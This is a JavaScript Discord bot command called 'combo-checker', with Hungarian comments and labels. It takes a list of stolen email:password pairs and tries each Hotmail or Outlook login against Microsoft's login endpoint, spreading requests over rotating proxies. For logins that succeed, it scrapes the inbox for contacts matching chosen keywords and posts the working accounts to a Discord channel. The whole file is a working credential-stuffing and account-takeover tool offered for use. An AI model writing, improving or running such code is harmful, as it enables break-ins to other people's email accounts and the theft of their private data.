const { SlashCommandBuilder, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

class ProxyManager {
    constructor(proxies) {
        this.proxies = proxies.filter(p => p.trim());
        this.current = 0;
    }
    
    getNext() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.current];
        this.current = (this.current + 1) % this.proxies.length;
        return proxy;
    }
}

async function checkCombo(email, password, keywords, proxy) {
    try {
        const loginData = new URLSearchParams({
            loginfmt: email,
            passwd: password,
            KMSI: '1',
            flow: '1',
            login: 'Sign in'
        });
        
        const loginResponse = await axios({
            method: 'POST',
            url: 'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1720000000&ty=1',
            data: loginData,
            timeout: 12000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/'
            },
            proxy: proxy ? {
                protocol: 'http',
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1] || 8080)
            } : undefined
        });
        
        const loginDataLower = loginResponse.data.toLowerCase();
        let valid = false;
        let keywordHits = [];
        let contacts = [];
        
        // Eredeti login sikeresség ellenőrzés
        if (loginDataLower.includes('outlook.live.com') || 
            loginDataLower.includes('office.com') || 
            loginDataLower.includes('mail.live.com') ||
            (!loginDataLower.includes('incorrect') && 
             !loginDataLower.includes('invalid') &&
             !loginDataLower.includes('hiba'))) {
            valid = true;
        }
        
        keywords.forEach(keyword => {
            if (loginDataLower.includes(keyword.toLowerCase())) {
                keywordHits.push(keyword);
            }
        });
        
        if (valid) {
            try {
                const inboxResponse = await axios({
                    method: 'GET',
                    url: 'https://outlook.live.com/mail/inbox',
                    timeout: 10000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Referer': 'https://outlook.live.com/'
                    },
                    proxy: proxy ? {
                        protocol: 'http',
                        host: proxy.split(':')[0],
                        port: parseInt(proxy.split(':')[1] || 8080)
                    } : undefined,
                    maxRedirects: 3
                });
                
                const inboxHtml = inboxResponse.data.toLowerCase();
                const $ = cheerio.load(inboxHtml);
                
                // Részletes scraping (eredeti logika szerint)
                $('a[href*="mail"], .email, [title*="mail"], [data-email]').each((i, el) => {
                    const emailText = $(el).text().toLowerCase().trim();
                    if (emailText.includes('@') && emailText.length > 10) {
                        keywords.forEach(keyword => {
                            if (emailText.includes(keyword.toLowerCase()) || 
                                emailText.includes(keyword.replace('@', '').toLowerCase())) {
                                contacts.push(emailText);
                            }
                        });
                    }
                });
                
                $('body').text().split('\n').forEach(line => {
                    const lineLower = line.toLowerCase().trim();
                    keywords.forEach(keyword => {
                        if (lineLower.includes(keyword.toLowerCase()) && lineLower.includes('@')) {
                            contacts.push(lineLower);
                        }
                    });
                });
                
            } catch (inboxError) {}
        }
        
        return { 
            valid, 
            keywordHits, 
            contacts: [...new Set(contacts)],
            proxy: proxy || 'Direct' 
        };
        
    } catch (error) {
        return { valid: false, keywordHits: [], contacts: [], proxy: proxy || 'Direct', error: error.message };
    }
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('combo-checker')
        .setDescription('🔥 Combo + Proxy + Keywords + CONTACTS checker')
        .addAttachmentOption(option =>
            option.setName('combo')
                .setDescription('Combo list (email:pass)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('keywords')
                .setDescription('Keywords & Contacts (pl. rockstar, amazon)')
                .setRequired(true))
        .addAttachmentOption(option =>
            option.setName('proxies')
                .setDescription('Proxy list (ip:port)')
                .setRequired(false))
        .addChannelOption(option =>
            option.setName('channel')
                .setDescription('Output channel')
                .setRequired(false)),
    
    async execute(interaction, client) {
        await interaction.deferReply();
        
        // Aktív check jelzése a stop parancshoz
        client.activeChecks.set(interaction.guildId, true);
        
        const comboFile = interaction.options.getAttachment('combo');
        const proxyFile = interaction.options.getAttachment('proxies');
        const keywordsStr = interaction.options.getString('keywords');
        const outputChannel = interaction.options.getChannel('channel') || interaction.channel;
        
        const keywords = keywordsStr.split(/[\s,]+/)
            .map(kw => kw.trim().toLowerCase())
            .filter(kw => kw.length > 1);
        
        const comboBuffer = await fetch(comboFile.url).then(r => r.arrayBuffer());
        const comboText = Buffer.from(comboBuffer).toString('utf-8');
        
        let proxies = [];
        if (proxyFile) {
            const proxyBuffer = await fetch(proxyFile.url).then(r => r.arrayBuffer());
            proxies = Buffer.from(proxyBuffer).toString('utf-8').split('\n').map(p => p.trim()).filter(p => p);
        }
        
        // Nincs limit (slice eltávolítva)
        const combos = comboText.split('\n')
            .map(line => line.trim())
            .filter(line => line.includes(':'))
            .map(line => {
                const parts = line.split(':', 2);
                return { 
                    email: parts[0].trim().toLowerCase(), 
                    pass: parts[1] ? parts[1].trim() : '' 
                };
            })
            .filter(combo => combo.email.includes('@hotmail') || combo.email.includes('@outlook'));
        
        const proxyManager = new ProxyManager(proxies);
        
        let stats = { valid: 0, hits: 0, processed: 0 };
        let hitCombos = [];
        let validOnlyCombos = [];
        let stopped = false;

        const progressEmbed = new EmbedBuilder()
            .setTitle('🔥 ULTIMATE CHECKER FUT')
            .setColor(0x0099ff)
            .addFields(
                { name: '📊 Progress', value: `0 / ${combos.length}`, inline: true },
                { name: '✅ Valid', value: '0', inline: true },
                { name: '🔥 Hits', value: '0', inline: true }
            );
        
        await interaction.editReply({ embeds: [progressEmbed] });

        for (let i = 0; i < combos.length; i++) {
            // Ellenőrizzük, hogy leállították-e
            if (client.activeChecks.get(interaction.guildId) === false) {
                stopped = true;
                break;
            }

            const combo = combos[i];
            const result = await checkCombo(combo.email, combo.pass, keywords, proxyManager.getNext());
            stats.processed++;
            
            if (result.valid) {
                stats.valid++;
                const line = `${combo.email}:${combo.pass} | Proxy: ${result.proxy}`;
                
                if (result.keywordHits.length > 0 || result.contacts.length > 0) {
                    stats.hits++;
                    hitCombos.push(`${line} | Hits: ${[...result.keywordHits, ...result.contacts].join(',')}`);
                } else {
                    validOnlyCombos.push(line);
                }
            }
            
            // Embed frissítése
            if (i % 2 === 0 || i === combos.length - 1) {
                progressEmbed.setFields(
                    { name: '📊 Progress', value: `${i + 1} / ${combos.length}`, inline: true },
                    { name: '✅ Valid', value: stats.valid.toString(), inline: true },
                    { name: '🔥 Hits', value: stats.hits.toString(), inline: true }
                );
                await interaction.editReply({ embeds: [progressEmbed] });
            }
            
            await new Promise(r => setTimeout(r, 2500));
        }
        
        const finalTitle = stopped ? '⏹️ FOLYAMAT MEGSZAKÍTVA' : '✅ CHECK KÉSZ!';
        const finalEmbed = new EmbedBuilder()
            .setTitle(finalTitle)
            .setColor(stopped ? 0xffaa00 : 0x00ff00)
            .addFields(
                { name: '📊 Összes vizsgált', value: stats.processed.toString(), inline: true },
                { name: '🔥 Hits (Találatok)', value: stats.hits.toString(), inline: true },
                { name: '✅ Sima Valid', value: validOnlyCombos.length.toString(), inline: true }
            );
        
        await interaction.followUp({ embeds: [finalEmbed] });
        
        // Fájlok generálása és küldése
        if (hitCombos.length > 0) {
            const hitPath = path.join(__dirname, `ultimate_hits_${Date.now()}.txt`);
            fs.writeFileSync(hitPath, `🔥 TALÁLATOK\n\n` + hitCombos.join('\n'));
            await outputChannel.send({ content: `📥 **ULTIMATE HITS (${hitCombos.length})**`, files: [new AttachmentBuilder(hitPath)] });
            fs.unlinkSync(hitPath);
        }
        
        if (validOnlyCombos.length > 0) {
            const validPath = path.join(__dirname, `valid_only_${Date.now()}.txt`);
            fs.writeFileSync(validPath, `✅ CSAK VALID (Találat nélkül)\n\n` + validOnlyCombos.join('\n'));
            await outputChannel.send({ content: `📥 **SIMA VALID FIOKOK (${validOnlyCombos.length})**`, files: [new AttachmentBuilder(validPath)] });
            fs.unlinkSync(validPath);
        }

        client.activeChecks.delete(interaction.guildId);
    }
};
